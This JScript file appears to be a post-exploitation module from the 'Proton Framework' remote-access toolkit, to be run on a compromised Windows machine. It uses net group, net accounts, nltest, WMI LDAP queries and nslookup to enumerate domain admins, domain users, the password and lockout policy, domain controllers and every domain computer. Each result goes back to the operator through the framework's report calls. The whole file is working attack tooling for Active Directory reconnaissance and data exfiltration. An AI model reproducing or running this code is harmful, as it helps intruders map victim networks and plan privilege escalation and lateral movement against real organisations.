//            ---------------------------------------------------
//                             Proton Framework              
//            ---------------------------------------------------
//                Copyright (C) <2019-2020>  <Entynetproject>
//
//        This program is free software: you can redistribute it and/or modify
//        it under the terms of the GNU General Public License as published by
//        the Free Software Foundation, either version 3 of the License, or
//        any later version.
//
//        This program is distributed in the hope that it will be useful,
//        but WITHOUT ANY WARRANTY; without even the implied warranty of
//        MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
//        GNU General Public License for more details.
//
//        You should have received a copy of the GNU General Public License
//        along with this program.  If not, see <http://www.gnu.org/licenses/>.

function ParseUsers(results)
{
    var retstring = "";
    var parse1 = results.split("-------\r\n")[1].split("The command completed")[0];
    var parse2 = parse1.split("\r\n");
    var tmp = [];
    for(var i = 0; i < parse2.length; i++)
    {
        tmp = parse2[i].split(" ");
        for(var j = 0; j < tmp.length; j++)
        {
            if(tmp[j])
            {
                retstring += tmp[j].toLowerCase() + "___";
            }
        }
    }
    return retstring;
}

function ParsePasswordPolicy(results)
{
    var retstring = "";
    retstring += results.split("time expires?:")[1].split("\r\n")[0].replace(/^\s+|\s+$/g, '') + "___";
    retstring += results.split("Minimum password age (days):")[1].split("\r\n")[0].replace(/^\s+|\s+$/g, '') + "___";
    retstring += results.split("Maximum password age (days):")[1].split("\r\n")[0].replace(/^\s+|\s+$/g, '') + "___";
    retstring += results.split("length:")[1].split("\r\n")[0].replace(/^\s+|\s+$/g, '') + "___";
    retstring += results.split("maintained:")[1].split("\r\n")[0].replace(/^\s+|\s+$/g, '') + "___";
    retstring += results.split("threshold:")[1].split("\r\n")[0].replace(/^\s+|\s+$/g, '') + "___";
    retstring += results.split("duration (minutes):")[1].split("\r\n")[0].replace(/^\s+|\s+$/g, '') + "___";
    retstring += results.split("window (minutes):")[1].split("\r\n")[0].replace(/^\s+|\s+$/g, '');
    return retstring;
}

function ParseDomainControllers(results)
{
    var retstring = "";
    var parse1 = results.split("Non-Site specific:\r\n")[1].split("The command completed")[0];
    var parse2 = parse1.split("\r\n");
    var tmp = [];
    for(var i = 0; i < parse2.length; i++)
    {
        // sometimes a warning message will appear in this section and we need to skip it
        if(parse2[i].indexOf("WARNING:") != -1)
        {
            continue;
        }
        var dcstring = "";
        tmp = parse2[i].split(" ");
        for(var j = 0; j < tmp.length; j++)
        {
            if(tmp[j])
            {
                dcstring += tmp[j].toLowerCase() + "___";
            }
        }
        var dcarray = dcstring.split("___");
        retstring += dcarray[0] + "*" + dcarray[dcarray.length-2] + "___";
    }
    return retstring;
}

function ResolveHostnames(hostnames)
{
    var retstring = "";
    var computers = hostnames.split("___");
    for (var i = 0; i < computers.length-1; i++)
    {
        if (computers[i] == 'null')
        {
            continue;
        }
        var nsresults = proton.shell.exec("nslookup "+computers[i], "~DIRECTORY~\\"+proton.uuid()+".txt");
        try
        {
            var ip = nsresults.split("Name:")[1].split("Address:")[1].split("\r\n")[0];
            ip = ip.replace(/\s/g, "");
        }
        catch(e)
        {
            var pingresults = proton.shell.exec("ping -4 -n 1 "+computers[i], "~DIRECTORY~\\"+proton.uuid()+".txt");
            try
            {
                var ip = pingresults.split("[")[1].split("]")[0];
            }
            catch(e)
            {
                var ip = "";
            }
        }

        retstring += computers[i] + "***" + ip + "___"
    }
    return retstring;
}

function ParseDomainComputers()
{
    var retstring = "";
    var objWMI = GetObject("winmgmts:{impersonationLevel=impersonate}!\\\\.\\root\\directory\\LDAP");
    var objComps = objWMI.Get("ds_computer").Instances_();
    var computercount = objComps.Count;
    for (var i = 0; i < computercount; i++) {
        var comp = objComps.ItemIndex(i);
        if (comp.ds_dnshostname != "null" || comp.ds_dnshostname != "")
        {
            retstring += comp.ds_dnshostname + "___";
        }
    }
    return retstring;
}

function findFQDN()
{
    var fqdn = "";

    try
    {
        fqdn = proton.WS.RegRead("HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Group Policy\\History\\MachineDomain");
        return fqdn;
    }
    catch (e)
    {}

    try
    {
        fqdn = proton.shell.exec("echo %userdnsdomain%", "~DIRECTORY~\\"+proton.uuid()+".txt");
        if (fqdn.split(" \r\n")[0] != "%userdnsdomain%")
        {
            return fqdn.split(" \r\n")[0];
        }
    }
    catch (e)
    {}

    try
    {
        fqdn = "";
        fqdnwhole = proton.shell.exec("whoami /fqdn", "~DIRECTORY~\\"+proton.uuid()+".txt");
        if (fqdnwhole.split(":")[0] != "ERROR")
        {
            var fqdnparts = fqdnwhole.split(",");
            for (var i = 0; i < fqdnparts.length; i++)
            {
                if (fqdnparts[i].split("=")[0] == "DC")
                {
                    fqdn += fqdnparts[i].split("=")[1] + ".";
                }
            }
            return fqdn.split("\r\n.")[0];
        }
    }
    catch (e)
    {}

    proton.work.report("NoDomain");
    throw true;
}

try
{
    var fqdn = findFQDN();
    var net = new ActiveXObject("WScript.Network");
    var netbios = net.UserDomain;

    var headers = {};
    headers["Header"] = "Key";
    proton.work.report(fqdn + "___" + netbios, headers);

    var domain_admins = ParseUsers(proton.shell.exec("net group \"Domain Admins\" /domain", "~DIRECTORY~\\"+proton.uuid()+".txt"));
    headers["Header"] = "Admins";
    proton.work.report(domain_admins, headers);

    var domain_users = ParseUsers(proton.shell.exec("net group \"Domain Users\" /domain", "~DIRECTORY~\\"+proton.uuid()+".txt"));
    headers["Header"] = "Users";
    proton.work.report(domain_users, headers);

    var password_policy = ParsePasswordPolicy(proton.shell.exec("net accounts /domain", "~DIRECTORY~\\"+proton.uuid()+".txt"));
    headers["Header"] = "PassPolicy";
    proton.work.report(password_policy, headers);

    var check_nltest_exist = proton.shell.exec("nltest /?", "~DIRECTORY~\\"+proton.uuid()+".txt");
    if (check_nltest_exist.indexOf("not recognized") == -1)
    {
        var domain_controllers = ParseDomainControllers(proton.shell.exec("nltest /dnsgetdc:"+fqdn, "~DIRECTORY~\\"+proton.uuid()+".txt"));
        headers["Header"] = "DomainControllers";
        proton.work.report(domain_controllers, headers);
    }

    var domain_computers = ParseDomainComputers();
    headers["Header"] = "DomainComputers";
    proton.work.report(domain_computers, headers);

    var resolved_computers = ResolveHostnames(domain_computers);
    headers["Header"] = "ResolvedComputers";
    proton.work.report(resolved_computers, headers);

    proton.work.report("Complete");

}
catch(e)
{
    proton.work.error(e);
}
proton.exit();
